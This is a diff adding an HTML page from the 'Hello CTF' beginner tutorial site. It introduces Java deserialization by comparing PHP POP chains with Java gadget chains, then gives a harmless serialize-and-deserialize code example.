@@ -1,0 +1,1627 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>Java反序列化 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <div class="tn-group">文件与编码基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">隐写分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">取证分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <div class="tn-group">环境与工具</div>
+      
+  
+    
+      <a class="tn-link" href="../web_env/">Web环境设置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_install/">Docker安装配置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_env/">Docker与漏洞环境</a>
+    
+  
+    
+      <a class="tn-link" href="../vm_lab/">虚拟机与网络模拟</a>
+    
+  
+    
+      <a class="tn-link" href="../burp/">Burp Suite</a>
+    
+  
+    
+      <a class="tn-link" href="../py_script/">Python脚本</a>
+    
+  
+    
+      <a class="tn-link" href="../http/">HTTP协议</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <div class="tn-group">信息收集</div>
+      
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">PHP专题</div>
+      
+  
+    
+      <a class="tn-link" href="../php_features/">PHP特性与常见绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser/">PHP反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">注入类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../nosql/">NoSQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../csrf/">CSRF攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">文件类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">命令与代码执行</div>
+      
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../session_jwt/">会话与认证安全</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <div class="tn-group">语言扩展 | 世界不止有PHP</div>
+      
+  
+    
+      <a class="tn-link" href="../py_unser/">Python反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../py_sandbox/">Python沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../flask_sec/">Flask安全</a>
+    
+  
+    
+      <a class="tn-link" href="../prototype_pollution/">原型链污染</a>
+    
+  
+    
+      <a class="tn-link" href="../js_sandbox/">JS沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../js_reverse/">JS逆向</a>
+    
+  
+    
+      <a class="tn-link" href="../java_basic/">Java安全基础</a>
+    
+  
+    
+      <a class="tn-link on" href="./">Java反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../spring/">Spring漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../java_audit/">Java代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">进阶专题</div>
+      
+  
+    
+      <a class="tn-link" href="../waf_bypass/">WAF绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../http_smuggling/">请求走私</a>
+    
+  
+    
+      <a class="tn-link" href="../cache_poisoning/">缓存投毒</a>
+    
+  
+    
+      <a class="tn-link" href="../xs_leaks/">XS-Leaks</a>
+    
+  
+    
+      <a class="tn-link" href="../web_crypto/">密码学应用题</a>
+    
+  
+    
+      <a class="tn-link" href="../cloud_container/">云与容器安全</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">实战能力</div>
+      
+  
+    
+      <div class="tn-group">渗透链路基础</div>
+      
+  
+    
+      <a class="tn-link" href="../pentest_flow/">渗透流程总览</a>
+    
+  
+    
+      <a class="tn-link" href="../two_layer/">两层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../foothold/">立足点建立</a>
+    
+  
+    
+      <a class="tn-link" href="../internal_recon/">内网信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../proxy_tunnel/">代理与隧道</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">多层网络渗透</div>
+      
+  
+    
+      <a class="tn-link" href="../three_layer/">三层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../multi_layer/">多层网络综合</a>
+    
+  
+    
+      <a class="tn-link" href="../ad_basic/">域渗透入门</a>
+    
+  
+    
+      <a class="tn-link" href="../lateral/">横向移动</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">对抗与综合</div>
+      
+  
+    
+      <a class="tn-link" href="../awd/">AWD模式</a>
+    
+  
+    
+      <a class="tn-link" href="../web_pwn/">Web与二进制结合</a>
+    
+  
+    
+      <a class="tn-link" href="../nday/">Nday利用</a>
+    
+  
+    
+      <a class="tn-link" href="../review/">Writeup复盘方法</a>
+    
+  
+
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/env/">环境配置</a>
+    
+  
+    
+      <div class="tn-group">基础知识</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">密码体系</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <div class="tn-group">环境与基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">栈溢出</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">ROP利用</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="java">Java反序列化<a class="headerlink" href="#java" title="Permanent link">¶</a></h1>
+<p>如果你已经学过 <a href="../php_unser/">PHP反序列化</a> 一章，那么恭喜你，Java 反序列化的核心思想你已经会了一半。</p>
+<p>回忆一下 PHP 反序列化的攻击模型：攻击者控制 <code>unserialize()</code> 的输入，精心构造一个序列化字符串，使得反序列化过程中自动触发 <code>__wakeup()</code>、<code>__destruct()</code> 等魔术方法；再通过把对象当作属性层层嵌套，让这些魔术方法像多米诺骨牌一样依次触发，最终走到 <code>eval()</code>、<code>system()</code> 这样的危险函数——这就是 <strong>POP 链（Property-Oriented Programming）</strong>。</p>
+<p>Java 反序列化几乎是一模一样的故事，只是换了一套角色：</p>
+<table>
+<thead>
+<tr>
+<th>PHP</th>
+<th>Java</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>serialize()</code> / <code>unserialize()</code></td>
+<td><code>ObjectOutputStream.writeObject()</code> / <code>ObjectInputStream.readObject()</code></td>
+</tr>
+<tr>
+<td><code>__wakeup()</code>、<code>__destruct()</code> 等魔术方法</td>
+<td>类自定义的 <code>readObject()</code> 方法</td>
+</tr>
+<tr>
+<td>POP 链</td>
+<td><strong>Gadget Chain</strong>（利用链 / 调用链）</td>
+</tr>
+<tr>
+<td><code>O:4:"User":...</code> 文本格式</td>
+<td><code>AC ED 00 05</code> 开头的二进制流</td>
+</tr>
+</tbody>
+</table>
+<p>一句话概括：<strong>PHP 里我们找魔术方法拼 POP 链，Java 里我们找 <code>readObject()</code> 及它间接调用的方法拼 gadget chain</strong>。链式调用、属性可控、最终落到危险函数，思想完全相通。</p>
+<p>不同的是，PHP 的魔术方法是语言内建的、每个类都能写；而 Java 的 gadget 来自 <strong>代码库里已有的类</strong>——JDK 自身和各种第三方依赖（Commons-Collections、fastjson……）里那些"看起来人畜无害"的类，只要它实现了 <code>Serializable</code> 接口、有自定义 <code>readObject()</code>、并且方法里会调用可控属性上的其他方法，就可能成为链上的一环。这也是 Java 反序列化漏洞比 PHP 更依赖"环境里有谁"的原因。</p>
+<h2 id="java-readobject">Java 序列化格式与 readObject 触发点<a class="headerlink" href="#java-readobject" title="Permanent link">¶</a></h2>
+<h3 id="_1">最小可运行示例<a class="headerlink" href="#_1" title="Permanent link">¶</a></h3>
+<p>Java 中一个类只要实现了 <code>java.io.Serializable</code> 接口就可以被序列化：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Demo</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="c1">// 目标类：实现 Serializable 接口</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="kd">class</span> <span class="nc">User</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">        </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="nf">User</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">User</span><span class="p">(</span><span class="s">"Probius_Official"</span><span class="p">);</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">        </span><span class="c1">// 序列化：对象 -&gt; 字节流</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">bos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span>
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">bos</span><span class="p">);</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bos</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span>
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="w">        </span><span class="c1">// 反序列化：字节流 -&gt; 对象</span>
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">back</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">User</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">back</span><span class="p">.</span><span class="na">name</span><span class="p">);</span>
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="p">}</span>
+</code></pre></div>
